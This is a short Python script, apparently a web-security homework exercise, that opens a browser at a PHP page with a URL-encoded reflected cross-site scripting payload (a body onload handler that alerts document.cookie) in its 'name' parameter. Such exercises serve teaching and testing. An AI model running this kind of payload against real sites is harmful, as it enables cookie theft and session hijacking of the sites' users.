import webbrowser

url = 'http://www.wsb.com/Homework3/case08.php?name=%3Cbody+onload%3D%22alert%28document.cookie%29%3B%22%3E#'

new = 2
webbrowser.open(url, new=new)
